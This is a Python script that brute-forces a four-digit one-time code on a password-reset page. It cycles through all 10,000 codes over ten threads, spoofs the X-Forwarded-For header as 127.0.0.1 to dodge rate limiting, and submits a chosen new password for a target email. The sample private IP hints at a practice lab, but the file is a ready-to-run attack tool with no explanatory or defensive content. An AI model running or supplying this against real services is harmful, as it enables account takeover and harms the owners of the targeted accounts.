import requests
from concurrent.futures import ThreadPoolExecutor

# Function to take user inputs for IP, URL, and email
def get_user_input():
    ip = input("Enter the IP address (e.g., 10.10.84.173): ")
    url = input("Enter the target URL (e.g., /reset_password.php): ")
    email = input("Enter the email address: ")
    return ip, url, email

# Function to attempt submitting an OTP
def try_otp(otp_str, otp_url, data, headers):
    data['otp'] = otp_str
    response = requests.post(otp_url, data=data, headers=headers)
    
    print(f"Trying OTP: {otp_str} - Status Code: {response.status_code}")
    
    # Check if the login was successful (you need to check the response for success or failure)
    if 'Success' in response.text:  # Adjust based on actual success indicator
        print(f"OTP Found: {otp_str}")
        return otp_str

    return None

# Function to initiate the brute force process using multiple threads
def brute_force_otp(ip, url, email):
    # Construct the full URL
    otp_url = f'http://{ip}{url}'
    
    # Define headers (set X-Forwarded-For to 127.0.0.1)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Forwarded-For': '127.0.0.1',  # Spoofing IP address to 127.0.0.1
    }

    # Define the base data (email address is added here)
    data = {
        'email': email,  # The email used for the OTP submission
        'password': 'password123',     # Adjust the password as needed
        'otp': '',  # OTP will be added dynamically in the loop
    }

    # Create a pool of threads to try OTPs concurrently
    with ThreadPoolExecutor(max_workers=10) as executor:
        # Generate all possible 4-digit OTPs (0000 to 9999)
        otp_range = [str(i).zfill(4) for i in range(10000)]
        
        # Submit all OTP attempts to the thread pool
        results = executor.map(lambda otp: try_otp(otp, otp_url, data, headers), otp_range)
        
        # Check the results and return the correct OTP
        for result in results:
            if result is not None:
                return result

    print("OTP not found within 4-digit range")
    return None

# Get the user input (IP, URL, and email)
ip, url, email = get_user_input()

# Run the brute force attempt
brute_force_otp(ip, url, email)
